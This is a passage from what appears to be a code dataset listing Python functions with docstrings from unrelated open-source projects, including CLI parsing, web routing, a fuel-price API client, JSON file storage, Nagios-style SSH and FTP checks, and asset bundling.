            "def _splitHeaders(headers):\n    \"\"\"\n    Split an HTTP header whose components are separated with commas.\n\n    Each component is then split on semicolons and the component arguments\n    converted into a `dict`.\n\n    @return: `list` of 2-`tuple` of `bytes`, `dict`\n    @return: List of header arguments and mapping of component argument names\n        to values.\n    \"\"\"\n    return [cgi.parse_header(value)\n            for value in chain.from_iterable(\n                s.split(',') for s in headers\n                if s)]"
        ],
        [
            "def contentEncoding(requestHeaders, encoding=None):\n    \"\"\"\n    Extract an encoding from a ``Content-Type`` header.\n\n    @type  requestHeaders: `twisted.web.http_headers.Headers`\n    @param requestHeaders: Request headers.\n\n    @type  encoding: `bytes`\n    @param encoding: Default encoding to assume if the ``Content-Type``\n        header is lacking one. Defaults to ``UTF-8``.\n\n    @rtype: `bytes`\n    @return: Content encoding.\n    \"\"\"\n    if encoding is None:\n        encoding = b'utf-8'\n    headers = _splitHeaders(\n        requestHeaders.getRawHeaders(b'Content-Type', []))\n    if headers:\n        return headers[0][1].get(b'charset', encoding)\n    return encoding"
        ],
        [
            "def maybe(f, default=None):\n    \"\"\"\n    Create a nil-safe callable decorator.\n\n    If the wrapped callable receives ``None`` as its argument, it will return\n    ``None`` immediately.\n    \"\"\"\n    @wraps(f)\n    def _maybe(x, *a, **kw):\n        if x is None:\n            return default\n        return f(x, *a, **kw)\n    return _maybe"
        ],
        [
            "def settings(path=None, with_path=None):\n    \"\"\"\n    Get or set `Settings._wrapped`\n\n    :param str path: a python module file,\n        if user set it,write config to `Settings._wrapped`\n    :param str with_path: search path\n    :return: A instance of `Settings`\n    \"\"\"\n\n    if path:\n        Settings.bind(path, with_path=with_path)\n\n    return Settings._wrapped"
        ],
        [
            "def bind(mod_path, with_path=None):\n        \"\"\"\n        bind user variable to `_wrapped`\n\n        .. note::\n\n            you don't need call this method by yourself.\n\n            program will call it in  `cliez.parser.parse`\n\n\n        .. expection::\n\n            if path is not correct,will cause an `ImportError`\n\n\n        :param str mod_path: module path, *use dot style,'mod.mod1'*\n        :param str with_path: add path to `sys.path`,\n            if path is file,use its parent.\n        :return: A instance of `Settings`\n        \"\"\"\n\n        if with_path:\n            if os.path.isdir(with_path):\n                sys.path.insert(0, with_path)\n            else:\n                sys.path.insert(0, with_path.rsplit('/', 2)[0])\n            pass\n\n        # raise `ImportError` mod_path if not exist\n        mod = importlib.import_module(mod_path)\n\n        settings = Settings()\n\n        for v in dir(mod):\n            if v[0] == '_' or type(getattr(mod, v)).__name__ == 'module':\n                continue\n            setattr(settings, v, getattr(mod, v))\n            pass\n\n        Settings._path = mod_path\n        Settings._wrapped = settings\n\n        return settings"
        ],
        [
            "def get_version():\n    \"\"\"\n    Get the version from version module without importing more than\n    necessary.\n    \"\"\"\n    version_module_path = os.path.join(\n        os.path.dirname(__file__), \"txspinneret\", \"_version.py\")\n    # The version module contains a variable called __version__\n    with open(version_module_path) as version_module:\n        exec(version_module.read())\n    return locals()[\"__version__\"]"
        ],
        [
            "def send(self, use_open_peers=True, queue=True, **kw):\n        \"\"\"\n        send a transaction immediately. Failed transactions are picked up by the TxBroadcaster\n\n        :param ip: specific peer IP to send tx to\n        :param port: port of specific peer\n        :param use_open_peers: use Arky's broadcast method\n        \"\"\"\n\n        if not use_open_peers:\n            ip = kw.get('ip')\n            port = kw.get('port')\n            peer = 'http://{}:{}'.format(ip, port)\n            res = arky.rest.POST.peer.transactions(peer=peer, transactions=[self.tx.tx])\n\n        else:\n            res = arky.core.sendPayload(self.tx.tx)\n\n        if self.tx.success != '0.0%':\n            self.tx.error = None\n            self.tx.success = True\n        else:\n            self.tx.error = res['messages']\n            self.tx.success = False\n\n        self.tx.tries += 1\n        self.tx.res = res\n\n        if queue:\n            self.tx.send = True\n\n        self.__save()\n        return res"
        ],
        [
            "def check_confirmations_or_resend(self, use_open_peers=False, **kw):\n        \"\"\"\n        check if a tx is confirmed, else resend it.\n\n        :param use_open_peers: select random peers fro api/peers endpoint\n        \"\"\"\n        if self.confirmations() == 0:\n            self.send(use_open_peers, **kw)"
        ],
        [
            "def command_list():\n    \"\"\"\n    Get sub-command list\n\n    .. note::\n\n        Don't use logger handle this function errors.\n\n        Because the error should be a code error,not runtime error.\n\n\n    :return: `list` matched sub-parser\n    \"\"\"\n    from cliez.conf import COMPONENT_ROOT\n\n    root = COMPONENT_ROOT\n\n    if root is None:\n        sys.stderr.write(\"cliez.conf.COMPONENT_ROOT not set.\\n\")\n        sys.exit(2)\n        pass\n\n    if not os.path.exists(root):\n        sys.stderr.write(\n            \"please set a valid path for `cliez.conf.COMPONENT_ROOT`\\n\")\n        sys.exit(2)\n        pass\n\n    try:\n        path = os.listdir(os.path.join(root, 'components'))\n        return [f[:-3] for f in path if\n                f.endswith('.py') and f != '__init__.py']\n    except FileNotFoundError:\n        return []"
        ],
        [
            "def append_arguments(klass, sub_parsers, default_epilog, general_arguments):\n    \"\"\"\n    Add class options to argparser options.\n\n    :param cliez.component.Component klass: subclass of Component\n    :param Namespace sub_parsers:\n    :param str default_epilog: default_epilog\n    :param list general_arguments: global options, defined by user\n    :return: Namespace subparser\n    \"\"\"\n\n    entry_name = hump_to_underscore(klass.__name__).replace(\n        '_component',\n        '')\n\n    # set sub command document\n    epilog = default_epilog if default_epilog \\\n        else 'This tool generate by `cliez` ' \\\n             'https://www.github.com/wangwenpei/cliez'\n\n    sub_parser = sub_parsers.add_parser(entry_name, help=klass.__doc__,\n                                        epilog=epilog)\n    sub_parser.description = klass.add_arguments.__doc__\n\n    # add slot arguments\n    if hasattr(klass, 'add_slot_args'):\n        slot_args = klass.add_slot_args() or []\n        for v in slot_args:\n            sub_parser.add_argument(*v[0], **v[1])\n        sub_parser.description = klass.add_slot_args.__doc__\n        pass\n\n    user_arguments = klass.add_arguments() or []\n\n    for v in user_arguments:\n        sub_parser.add_argument(*v[0], **v[1])\n\n    if not klass.exclude_global_option:\n        for v in general_arguments:\n            sub_parser.add_argument(*v[0], **v[1])\n\n    return sub_parser"
        ],
        [
            "def parse(parser, argv=None, settings_key='settings', no_args_func=None):\n    \"\"\"\n    parser cliez app\n\n    :param argparse.ArgumentParser parser: an instance\n        of argparse.ArgumentParser\n    :param argv: argument list,default is `sys.argv`\n    :type argv: list or tuple\n\n    :param str settings: settings option name,\n        default is settings.\n\n    :param object no_args_func: a callable object.if no sub-parser matched,\n        parser will call it.\n\n    :return:  an instance of `cliez.component.Component` or its subclass\n    \"\"\"\n\n    argv = argv or sys.argv\n    commands = command_list()\n\n    if type(argv) not in [list, tuple]:\n        raise TypeError(\"argv only can be list or tuple\")\n\n    # match sub-parser\n    if len(argv) >= 2 and argv[1] in commands:\n        sub_parsers = parser.add_subparsers()\n        class_name = argv[1].capitalize() + 'Component'\n\n        from cliez.conf import (COMPONENT_ROOT,\n                                LOGGING_CONFIG,\n                                EPILOG,\n                                GENERAL_ARGUMENTS)\n\n        sys.path.insert(0, os.path.dirname(COMPONENT_ROOT))\n        mod = importlib.import_module(\n            '{}.components.{}'.format(os.path.basename(COMPONENT_ROOT),\n                                      argv[1]))\n\n        # dynamic load component\n        klass = getattr(mod, class_name)\n        sub_parser = append_arguments(klass, sub_parsers, EPILOG,\n                                      GENERAL_ARGUMENTS)\n        options = parser.parse_args(argv[1:])\n\n        settings = Settings.bind(\n            getattr(options, settings_key)\n        ) if settings_key and hasattr(options, settings_key) else None\n\n        obj = klass(parser, sub_parser, options, settings)\n\n        # init logger\n        logger_level = logging.CRITICAL\n        if hasattr(options, 'verbose'):\n            if options.verbose == 1:\n                logger_level = logging.ERROR\n            elif options.verbose == 2:\n                logger_level = logging.WARNING\n            elif options.verbose == 3:\n                logger_level = logging.INFO\n                obj.logger.setLevel(logging.INFO)\n            pass\n\n        if hasattr(options, 'debug') and options.debug:\n            logger_level = logging.DEBUG\n            # http lib use a strange way to logging\n            try:\n                import http.client as http_client\n                http_client.HTTPConnection.debuglevel = 1\n            except Exception:\n                # do nothing\n                pass\n            pass\n\n        loggers = LOGGING_CONFIG['loggers']\n        for k, v in loggers.items():\n            v.setdefault('level', logger_level)\n            if logger_level in [logging.INFO, logging.DEBUG]:\n                v['handlers'] = ['stdout']\n            pass\n\n        logging_config.dictConfig(LOGGING_CONFIG)\n        # this may not necessary\n        # obj.logger.setLevel(logger_level)\n\n        obj.run(options)\n\n        # return object to make unit test easy\n        return obj\n\n    # print all sub commands when user set.\n    if not parser.description and len(commands):\n        sub_parsers = parser.add_subparsers()\n        [sub_parsers.add_parser(v) for v in commands]\n        pass\n    pass\n\n    options = parser.parse_args(argv[1:])\n    if no_args_func and callable(no_args_func):\n        return no_args_func(options)\n    else:\n        parser._print_message(\"nothing to do...\\n\")\n    pass"
        ],
        [
            "def hump_to_underscore(name):\n    \"\"\"\n    Convert Hump style to underscore\n\n    :param name: Hump Character\n    :return: str\n    \"\"\"\n    new_name = ''\n\n    pos = 0\n    for c in name:\n        if pos == 0:\n            new_name = c.lower()\n        elif 65 <= ord(c) <= 90:\n            new_name += '_' + c.lower()\n            pass\n        else:\n            new_name += c\n        pos += 1\n        pass\n    return new_name"
        ],
        [
            "def get_fuel_prices(self) -> GetFuelPricesResponse:\n        \"\"\"Fetches fuel prices for all stations.\"\"\"\n        response = requests.get(\n            '{}/prices'.format(API_URL_BASE),\n            headers=self._get_headers(),\n            timeout=self._timeout,\n        )\n\n        if not response.ok:\n            raise FuelCheckError.create(response)\n\n        return GetFuelPricesResponse.deserialize(response.json())"
        ],
        [
            "def get_fuel_prices_for_station(\n            self,\n            station: int\n    ) -> List[Price]:\n        \"\"\"Gets the fuel prices for a specific fuel station.\"\"\"\n        response = requests.get(\n            '{}/prices/station/{}'.format(API_URL_BASE, station),\n            headers=self._get_headers(),\n            timeout=self._timeout,\n        )\n\n        if not response.ok:\n            raise FuelCheckError.create(response)\n\n        data = response.json()\n        return [Price.deserialize(data) for data in data['prices']]"
        ],
        [
            "def get_fuel_prices_within_radius(\n            self, latitude: float, longitude: float, radius: int,\n            fuel_type: str, brands: Optional[List[str]] = None\n    ) -> List[StationPrice]:\n        \"\"\"Gets all the fuel prices within the specified radius.\"\"\"\n\n        if brands is None:\n            brands = []\n        response = requests.post(\n            '{}/prices/nearby'.format(API_URL_BASE),\n            json={\n                'fueltype': fuel_type,\n                'latitude': latitude,\n                'longitude': longitude,\n                'radius': radius,\n                'brand': brands,\n            },\n            headers=self._get_headers(),\n            timeout=self._timeout,\n        )\n\n        if not response.ok:\n            raise FuelCheckError.create(response)\n\n        data = response.json()\n        stations = {\n            station['code']: Station.deserialize(station)\n            for station in data['stations']\n        }\n        station_prices = []  # type: List[StationPrice]\n        for serialized_price in data['prices']:\n            price = Price.deserialize(serialized_price)\n            station_prices.append(StationPrice(\n                price=price,\n                station=stations[price.station_code]\n            ))\n\n        return station_prices"
        ],
        [
            "def get_fuel_price_trends(self, latitude: float, longitude: float,\n                              fuel_types: List[str]) -> PriceTrends:\n        \"\"\"Gets the fuel price trends for the given location and fuel types.\"\"\"\n        response = requests.post(\n            '{}/prices/trends/'.format(API_URL_BASE),\n            json={\n                'location': {\n                    'latitude': latitude,\n                    'longitude': longitude,\n                },\n                'fueltypes': [{'code': type} for type in fuel_types],\n            },\n            headers=self._get_headers(),\n            timeout=self._timeout,\n        )\n\n        if not response.ok:\n            raise FuelCheckError.create(response)\n\n        data = response.json()\n        return PriceTrends(\n            variances=[\n                Variance.deserialize(variance)\n                for variance in data['Variances']\n            ],\n            average_prices=[\n                AveragePrice.deserialize(avg_price)\n                for avg_price in data['AveragePrices']\n            ]\n        )"
        ],
        [
            "def get_reference_data(\n            self,\n            modified_since: Optional[datetime.datetime] = None\n    ) -> GetReferenceDataResponse:\n        \"\"\"\n        Fetches API reference data.\n\n        :param modified_since: The response will be empty if no\n        changes have been made to the reference data since this\n        timestamp, otherwise all reference data will be returned.\n        \"\"\"\n\n        if modified_since is None:\n            modified_since = datetime.datetime(year=2010, month=1, day=1)\n\n        response = requests.get(\n            '{}/lovs'.format(API_URL_BASE),\n            headers={\n                'if-modified-since': self._format_dt(modified_since),\n                **self._get_headers(),\n            },\n            timeout=self._timeout,\n        )\n\n        if not response.ok:\n            raise FuelCheckError.create(response)\n\n        # return response.text\n        return GetReferenceDataResponse.deserialize(response.json())"
        ],
        [
            "def pre(self, command, output_dir, vars):\n        \"\"\"\n        Called before template is applied.\n        \"\"\"\n        # import pdb;pdb.set_trace()\n        vars['license_name'] = 'Apache'\n        vars['year'] = time.strftime('%Y', time.localtime())"
        ],
        [
            "def Text(name, encoding=None):\n    \"\"\"\n    Match a route parameter.\n\n    `Any` is a synonym for `Text`.\n\n    :type  name: `bytes`\n    :param name: Route parameter name.\n\n    :type  encoding: `bytes`\n    :param encoding: Default encoding to assume if the ``Content-Type``\n        header is lacking one.\n\n    :return: ``callable`` suitable for use with `route` or `subroute`.\n    \"\"\"\n    def _match(request, value):\n        return name, query.Text(\n            value,\n            encoding=contentEncoding(request.requestHeaders, encoding))\n    return _match"
        ],
        [
            "def Integer(name, base=10, encoding=None):\n    \"\"\"\n    Match an integer route parameter.\n\n    :type  name: `bytes`\n    :param name: Route parameter name.\n\n    :type  base: `int`\n    :param base: Base to interpret the value in.\n\n    :type  encoding: `bytes`\n    :param encoding: Default encoding to assume if the ``Content-Type``\n        header is lacking one.\n\n    :return: ``callable`` suitable for use with `route` or `subroute`.\n    \"\"\"\n    def _match(request, value):\n        return name, query.Integer(\n            value,\n            base=base,\n            encoding=contentEncoding(request.requestHeaders, encoding))\n    return _match"
        ],
        [
            "def _matchRoute(components, request, segments, partialMatching):\n    \"\"\"\n    Match a request path against our path components.\n\n    The path components are always matched relative to their parent is in the\n    resource hierarchy, in other words it is only possible to match URIs nested\n    more deeply than the parent resource.\n\n    :type  components: ``iterable`` of `bytes` or `callable`\n    :param components: Iterable of path components, to match against the\n        request, either static strings or dynamic parameters. As a convenience,\n        a single `bytes` component containing ``/`` may be given instead of\n        manually separating the components. If no components are given the null\n        route is matched, this is the case where ``segments`` is empty.\n\n    :type  segments: ``sequence`` of `bytes`\n    :param segments: Sequence of path segments, from the request, to match\n        against.\n\n    :type  partialMatching: `bool`\n    :param partialMatching: Allow partial matching against the request path?\n\n    :rtype: 2-`tuple` of `dict` keyed on `bytes` and `list` of `bytes`\n    :return: Pair of parameter results, mapping parameter names to processed\n        values, and a list of the remaining request path segments. If there is\n        no route match the result will be ``None`` and the original request path\n        segments.\n    \"\"\"\n    if len(components) == 1 and isinstance(components[0], bytes):\n        components = components[0]\n        if components[:1] == '/':\n            components = components[1:]\n        components = components.split('/')\n\n    results = OrderedDict()\n    NO_MATCH = None, segments\n    remaining = list(segments)\n\n    # Handle the null route.\n    if len(segments) == len(components) == 0:\n        return results, remaining\n\n    for us, them in izip_longest(components, segments):\n        if us is None:\n            if partialMatching:\n                # We've matched all of our components, there might be more\n                # segments for something else to process.\n                break\n            else:\n                return NO_MATCH\n        elif them is None:\n            # We've run out of path segments to match, so this route can't be\n            # the matching one.\n            return NO_MATCH\n\n        if callable(us):\n            name, match = us(request, them)\n            if match is None:\n                return NO_MATCH\n            results[name] = match\n        elif us != them:\n            return NO_MATCH\n        remaining.pop(0)\n\n    return results, remaining"
        ],
        [
            "def routedResource(f, routerAttribute='router'):\n    \"\"\"\n    Decorate a router-producing callable to instead produce a resource.\n\n    This simply produces a new callable that invokes the original callable, and\n    calls ``resource`` on the ``routerAttribute``.\n\n    If the router producer has multiple routers the attribute can be altered to\n    choose the appropriate one, for example:\n\n    .. code-block:: python\n\n        class _ComplexRouter(object):\n            router = Router()\n            privateRouter = Router()\n\n            @router.route('/')\n            def publicRoot(self, request, params):\n                return SomethingPublic(...)\n\n            @privateRouter.route('/')\n            def privateRoot(self, request, params):\n                return SomethingPrivate(...)\n\n        PublicResource = routedResource(_ComplexRouter)\n        PrivateResource = routedResource(_ComplexRouter, 'privateRouter')\n\n    :type  f: ``callable``\n    :param f: Callable producing an object with a `Router` attribute, for\n        example, a type.\n\n    :type  routerAttribute: `str`\n    :param routerAttribute: Name of the `Router` attribute on the result of\n        calling ``f``.\n\n    :rtype: `callable`\n    :return: Callable producing an `IResource`.\n    \"\"\"\n    return wraps(f)(\n        lambda *a, **kw: getattr(f(*a, **kw), routerAttribute).resource())"
        ],
        [
            "def _forObject(self, obj):\n        \"\"\"\n        Create a new `Router` instance, with it's own set of routes, for\n        ``obj``.\n        \"\"\"\n        router = type(self)()\n        router._routes = list(self._routes)\n        router._self = obj\n        return router"
        ],
        [
            "def _addRoute(self, f, matcher):\n        \"\"\"\n        Add a route handler and matcher to the collection of possible routes.\n        \"\"\"\n        self._routes.append((f.func_name, f, matcher))"
        ],
        [
            "def route(self, *components):\n        \"\"\"\n        See `txspinneret.route.route`.\n\n        This decorator can be stacked with itself to specify multiple routes\n        with a single handler.\n        \"\"\"\n        def _factory(f):\n            self._addRoute(f, route(*components))\n            return f\n        return _factory"
        ],
        [
            "def subroute(self, *components):\n        \"\"\"\n        See `txspinneret.route.subroute`.\n\n        This decorator can be stacked with itself to specify multiple routes\n        with a single handler.\n        \"\"\"\n        def _factory(f):\n            self._addRoute(f, subroute(*components))\n            return f\n        return _factory"
        ],
        [
            "def _tempfile(filename):\n    \"\"\"\n    Create a NamedTemporaryFile instance to be passed to atomic_writer\n    \"\"\"\n    return tempfile.NamedTemporaryFile(mode='w',\n                                       dir=os.path.dirname(filename),\n                                       prefix=os.path.basename(filename),\n                                       suffix=os.fsencode('.tmp'),\n                                       delete=False)"
        ],
        [
            "def atomic_write(filename):\n    \"\"\"\n    Open a NamedTemoraryFile handle in a context manager\n    \"\"\"\n    f = _tempfile(os.fsencode(filename))\n\n    try:\n        yield f\n\n    finally:\n        f.close()\n        # replace the original file with the new temp file (atomic on success)\n        os.replace(f.name, filename)"
        ],
        [
            "def get_item(filename, uuid):\n    \"\"\"\n    Read entry from JSON file\n    \"\"\"\n    with open(os.fsencode(str(filename)), \"r\") as f:\n        data = json.load(f)\n        results = [i for i in data if i[\"uuid\"] == str(uuid)]\n        if results:\n            return results\n        return None"
        ],
        [
            "def set_item(filename, item):\n    \"\"\"\n    Save entry to JSON file\n    \"\"\"\n    with atomic_write(os.fsencode(str(filename))) as temp_file:\n        with open(os.fsencode(str(filename))) as products_file:\n            # load the JSON data into memory\n            products_data = json.load(products_file)\n        # check if UUID already exists\n        uuid_list = [i for i in filter(\n            lambda z: z[\"uuid\"] == str(item[\"uuid\"]), products_data)]\n        if len(uuid_list) == 0:\n            # add the new item to the JSON file\n            products_data.append(item)\n            # save the new JSON to the temp file\n            json.dump(products_data, temp_file)\n            return True\n        return None"
        ],
        [
            "def update_item(filename, item, uuid):\n    \"\"\"\n    Update entry by UUID in the JSON file\n    \"\"\"\n    with atomic_write(os.fsencode(str(filename))) as temp_file:\n        with open(os.fsencode(str(filename))) as products_file:\n            # load the JSON data into memory\n            products_data = json.load(products_file)\n        # apply modifications to the JSON data wrt UUID\n        # TODO: handle this in a neat way\n        if 'products' in products_data[-1]:\n            # handle orders object\n            [products_data[i][\"products\"][0].update(item) for (\n                i, j) in enumerate(products_data) if j[\"uuid\"] == str(uuid)]\n        else:\n            # handle products object\n            [products_data[i].update(item) for (i, j) in enumerate(\n                products_data) if j[\"uuid\"] == str(uuid)]\n        # save the modified JSON data into the temp file\n        json.dump(products_data, temp_file)\n        return True"
        ],
        [
            "def command_handle(self):\n        \"\"\"Get the number of the shell command.\"\"\"\n        self.__results = self.execute(self.args.command)\n        self.close()\n\n        self.logger.debug(\"results: {}\".format(self.__results))\n        if not self.__results:\n            self.unknown(\"{} return nothing.\".format(self.args.command))\n        if len(self.__results) != 1:\n            self.unknown(\n                \"{} return more than one number.\".format(\n                    self.args.command))\n        self.__result = int(self.__results[0])\n        self.logger.debug(\"result: {}\".format(self.__result))\n        if not isinstance(self.__result, (int, long)):\n            self.unknown(\n                \"{} didn't return single number.\".format(\n                    self.args.command))\n\n        status = self.ok\n        # Compare the vlaue.\n        if self.__result > self.args.warning:\n            status = self.warning\n        if self.__result > self.args.critical:\n            status = self.critical\n\n        # Output\n        self.shortoutput = \"{0} return {1}.\".format(\n            self.args.command, self.__result)\n        [self.longoutput.append(line)\n         for line in self.__results if self.__results]\n        self.perfdata.append(\"{command}={result};{warn};{crit};0;\".format(\n            crit=self.args.critical,\n            warn=self.args.warning,\n            result=self.__result,\n            command=self.args.command))\n\n        # Return status with message to Nagios.\n        status(self.output(long_output_limit=None))\n        self.logger.debug(\"Return status and exit to Nagios.\")"
        ],
        [
            "def execute(self, command, timeout=None):\n        \"\"\"Execute a shell command.\"\"\"\n        try:\n            self.channel = self.ssh.get_transport().open_session()\n        except paramiko.SSHException as e:\n            self.unknown(\"Create channel error: %s\" % e)\n        try:\n            self.channel.settimeout(self.args.timeout if not timeout else timeout)\n        except socket.timeout as e:\n            self.unknown(\"Settimeout for channel error: %s\" % e)\n        try:\n            self.logger.debug(\"command: {}\".format(command))\n            self.channel.exec_command(command)\n        except paramiko.SSHException as e:\n            self.unknown(\"Execute command error: %s\" % e)\n        try:\n            self.stdin = self.channel.makefile('wb', -1)\n            self.stderr = map(string.strip, self.channel.makefile_stderr('rb', -1).readlines())\n            self.stdout = map(string.strip, self.channel.makefile('rb', -1).readlines())\n        except Exception as e:\n            self.unknown(\"Get result error: %s\" % e)\n        try:\n            self.status = self.channel.recv_exit_status()\n        except paramiko.SSHException as e:\n            self.unknown(\"Get return code error: %s\" % e)\n        else:\n            if self.status != 0:\n                self.unknown(\"Return code: %d , stderr: %s\" % (self.status, self.errors))\n            else:\n                return self.stdout\n        finally:\n            self.logger.debug(\"Execute command finish.\")"
        ],
        [
            "def slinky(filename, seconds_available, bucket_name, aws_key, aws_secret):\n    \"\"\"Simple program that creates an temp S3 link.\"\"\"\n    if not os.environ.get('AWS_ACCESS_KEY_ID') and os.environ.get('AWS_SECRET_ACCESS_KEY'):\n    \tprint 'Need to set environment variables for AWS access and create a slinky bucket.'\n    \texit()\n    \n    print create_temp_s3_link(filename, seconds_available, bucket_name)"
        ],
        [
            "def check_readable(self, timeout):\n        \"\"\"\n        Poll ``self.stdout`` and return True if it is readable.\n\n        :param float timeout: seconds to wait I/O\n        :return: True if readable, else False\n        :rtype: boolean\n        \"\"\"\n        rlist, wlist, xlist = select.select([self._stdout], [], [], timeout)\n        return bool(len(rlist))"
        ],
        [
            "def get_indices_list(s: Any) -> List[str]:\n    \"\"\" Retrieve a list of characters and escape codes where each escape\n        code uses only one index. The indexes will not match up with the\n        indexes in the original string.\n    \"\"\"\n    indices = get_indices(s)\n    return [\n        indices[i] for i in sorted(indices, key=int)\n    ]"
        ],
        [
            "def strip_codes(s: Any) -> str:\n    \"\"\" Strip all color codes from a string.\n        Returns empty string for \"falsey\" inputs.\n    \"\"\"\n    return codepat.sub('', str(s) if (s or (s == 0)) else '')"
        ],
        [
            "def init_build(self, asset, builder):\n        \"\"\"\n        Called when builder group collect files\n        Resolves absolute url if relative passed\n\n        :type asset: static_bundle.builders.Asset\n        :type builder: static_bundle.builders.StandardBuilder\n        \"\"\"\n        if not self.abs_path:\n            rel_path = utils.prepare_path(self.rel_bundle_path)\n            self.abs_bundle_path = utils.prepare_path([builder.config.input_dir, rel_path])\n            self.abs_path = True\n        self.input_dir = builder.config.input_dir"
        ],
        [
            "def add_file(self, *args):\n        \"\"\"\n        Add single file or list of files to bundle\n\n        :type: file_path: str|unicode\n        \"\"\"\n        for file_path in args:\n            self.files.append(FilePath(file_path, self))"
        ],
        [
            "def add_directory(self, *args, **kwargs):\n        \"\"\"\n        Add directory or directories list to bundle\n\n        :param exclusions: List of excluded paths\n\n        :type path: str|unicode\n        :type exclusions: list\n        \"\"\"\n        exc = kwargs.get('exclusions', None)\n        for path in args:\n            self.files.append(DirectoryPath(path, self, exclusions=exc))"
        ],
        [
            "def add_path_object(self, *args):\n        \"\"\"\n        Add custom path objects\n\n        :type: path_object: static_bundle.paths.AbstractPath\n        \"\"\"\n        for obj in args:\n            obj.bundle = self\n            self.files.append(obj)"
        ],
        [
            "def add_prepare_handler(self, prepare_handlers):\n        \"\"\"\n        Add prepare handler to bundle\n\n        :type: prepare_handler: static_bundle.handlers.AbstractPrepareHandler\n        \"\"\"\n        if not isinstance(prepare_handlers, static_bundle.BUNDLE_ITERABLE_TYPES):\n            prepare_handlers = [prepare_handlers]\n        if self.prepare_handlers_chain is None:\n            self.prepare_handlers_chain = []\n        for handler in prepare_handlers:\n            self.prepare_handlers_chain.append(handler)"
        ],
        [
            "def prepare(self):\n        \"\"\"\n        Called when builder run collect files in builder group\n\n        :rtype: list[static_bundle.files.StaticFileResult]\n        \"\"\"\n        result_files = self.collect_files()\n        chain = self.prepare_handlers_chain\n        if chain is None:\n            # default handlers\n            chain = [\n                LessCompilerPrepareHandler()\n            ]\n        for prepare_handler in chain:\n            result_files = prepare_handler.prepare(result_files, self)\n        return result_files"
        ],
        [
            "def filenumber_handle(self):\n        \"\"\"Get the number of files in the folder.\"\"\"\n        self.__results = []\n        self.__dirs = []\n        self.__files = []\n        self.__ftp = self.connect()\n        self.__ftp.dir(self.args.path, self.__results.append)\n        self.logger.debug(\"dir results: {}\".format(self.__results))\n        self.quit()\n\n        status = self.ok\n\n        for data in self.__results:\n            if \"<DIR>\" in data:\n                self.__dirs.append(str(data.split()[3]))\n            else:\n                self.__files.append(str(data.split()[2]))\n\n        self.__result = len(self.__files)\n        self.logger.debug(\"result: {}\".format(self.__result))\n\n        # Compare the vlaue.\n        if self.__result > self.args.warning:\n            status = self.warning\n        if self.__result > self.args.critical:\n            status = self.critical\n\n        # Output\n        self.shortoutput = \"Found {0} files in {1}.\".format(self.__result,\n                                                            self.args.path)\n        [self.longoutput.append(line)\n         for line in self.__results if self.__results]\n        self.perfdata.append(\"{path}={result};{warn};{crit};0;\".format(\n            crit=self.args.critical,\n            warn=self.args.warning,\n            result=self.__result,\n            path=self.args.path))\n\n        self.logger.debug(\"Return status and output.\")\n        status(self.output())"
        ],
        [
            "def register_json(self, data):\n        \"\"\"\n        Register the contents as JSON\n        \"\"\"\n        j = json.loads(data)\n        self.last_data_timestamp = \\\n                datetime.datetime.utcnow().replace(microsecond=0).isoformat()\n        try:\n            for v in j:\n                # prepare the sensor entry container\n                self.data[v[self.id_key]] = {}\n                # add the mandatory entries\n                self.data[v[self.id_key]][self.id_key] = \\\n                                            v[self.id_key]\n                self.data[v[self.id_key]][self.value_key] = \\\n                                            v[self.value_key]\n                # add the optional well known entries if provided\n                if self.unit_key in v:\n                    self.data[v[self.id_key]][self.unit_key] = \\\n                                            v[self.unit_key]\n                if self.threshold_key in v:\n                    self.data[v[self.id_key]][self.threshold_key] = \\\n                                            v[self.threshold_key]\n                # add any further entries found\n                for k in self.other_keys:\n                    if k in v:\n                        self.data[v[self.id_key]][k] = v[k]\n                # add the custom sensor time\n                if self.sensor_time_key in v:\n                    self.data[v[self.sensor_time_key]][self.sensor_time_key] = \\\n                                            v[self.sensor_time_key]\n                # last: add the time the data was received (overwriting any\n                # not properly defined timestamp that was already there)\n                self.data[v[self.id_key]][self.time_key] = \\\n                                            self.last_data_timestamp\n        except KeyError as e:\n            print(\"The main key was not found on the serial input line: \" + \\\n                    str(e))\n        except ValueError as e:\n            print(\"No valid JSON string received. Waiting for the next turn.\")\n            print(\"The error was: \" + str(e))"
        ],
        [
            "def get_translated_data(self):\n        \"\"\"\n        Translate the data with the translation table\n        \"\"\"\n        j = {}\n        for k in self.data:\n            d = {}\n            for l in self.data[k]:\n                d[self.translation_keys[l]] = self.data[k][l]\n            j[k] = d\n        return j"
        ],
        [
            "def get_json(self, prettyprint=False, translate=True):\n        \"\"\"\n        Get the data in JSON form\n        \"\"\"\n        j = []\n        if translate:\n            d = self.get_translated_data()\n        else:\n            d = self.data\n        for k in d:\n            j.append(d[k])\n        if prettyprint:\n            j = json.dumps(j, indent=2, separators=(',',': '))\n        else:\n            j = json.dumps(j)\n        return j"
        ],
        [
            "def get_json_tuples(self, prettyprint=False, translate=True):\n        \"\"\"\n        Get the data as JSON tuples\n        \"\"\"\n        j = self.get_json(prettyprint, translate)\n        if len(j) > 2:\n            if prettyprint:\n                j = j[1:-2] + \",\\n\"\n            else:\n                j = j[1:-1] + \",\"\n        else:\n            j = \"\"\n        return j"
        ],
        [
            "def get(self, url, params={}):\n        \"\"\"\n        Issues a GET request against the API, properly formatting the params\n\n        :param url: a string, the url you are requesting\n        :param params: a dict, the key-value of all the paramaters needed\n                       in the request\n        :returns: a dict parsed of the JSON response\n        \"\"\"\n\n        params.update({'api_key': self.api_key})\n        try:\n            response = requests.get(self.host + url, params=params)\n        except RequestException as e:\n            response = e.args\n\n        return self.json_parse(response.content)"
        ],
        [
            "def post(self, url, params={}, files=None):\n        \"\"\"\n        Issues a POST request against the API, allows for multipart data uploads\n\n        :param url: a string, the url you are requesting\n        :param params: a dict, the key-value of all the parameters needed\n                       in the request\n        :param files: a list, the list of tuples of files\n\n        :returns: a dict parsed of the JSON response\n        \"\"\"\n        params.update({'api_key': self.api_key})\n        try:\n            response = requests.post(self.host + url, data=params, files=files)\n            return self.json_parse(response.content)\n        except RequestException as e:\n            return self.json_parse(e.args)"
        ],
        [
